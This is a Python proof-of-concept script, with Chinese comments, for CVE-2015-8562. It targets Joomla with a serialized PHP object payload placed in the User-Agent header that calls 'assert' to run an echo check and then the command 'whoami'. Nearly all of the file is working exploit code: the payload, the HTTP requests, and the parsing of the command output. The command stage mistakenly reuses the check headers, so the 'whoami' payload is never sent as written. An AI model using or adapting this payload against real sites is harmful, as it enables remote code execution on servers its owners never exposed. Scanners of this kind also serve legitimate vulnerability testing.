#!/usr/bin/python3

'''
name: CVE-2015-8562漏洞
description: CVE-2015-8562漏洞可任意执行命令
'''

import re
import string
import random
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CVE_2015_8562_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta='' 
        words=''.join((string.ascii_letters,string.digits))
        for i in range(8):
            self.capta = self.capta + random.choice(words)
        self.echo_commnd = 'echo ' + self.capta
        self.command = 'whoami'
        self.check_headers = {
            "User-Agent":'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%s:"%s;JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'''%(len(self.echo_commnd)+28, self.echo_commnd) 
        }
        self.cmd_headers = {
            "User-Agent":'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%s:"%s;JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'''%(len(self.command)+28, self.command) 
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_s = requests.session()
            check_response = check_s.get(self.url,headers = self.check_headers, allow_redirects = False, verify=False)
            check_response = check_s.get(self.url)
            echo_info = check_response.text
            echo_result = re.findall(r'</html>(.*)',echo_info,re.S|re.I) 
            if self.capta in echo_result[0]:
                print('存在CVE-2015-8562漏洞')
                cmd_s = requests.session()
                cmd_response = cmd_s.get(self.url,headers = self.check_headers, allow_redirects = False, verify=False)
                cmd_response = cmd_s.get(self.url)
                cmd_info = cmd_response.text
                cmd_result = re.findall(r'</html>(.*)',cmd_info,re.S|re.I)
                print('执行whoami结果是:', cmd_result)
                return True
            else:
                print('不存在CVE-2015-8562漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在CVE-2015-8562漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2015_8562 = CVE_2015_8562_BaseVerify('http://127.0.0.1:8080')
    CVE_2015_8562.run()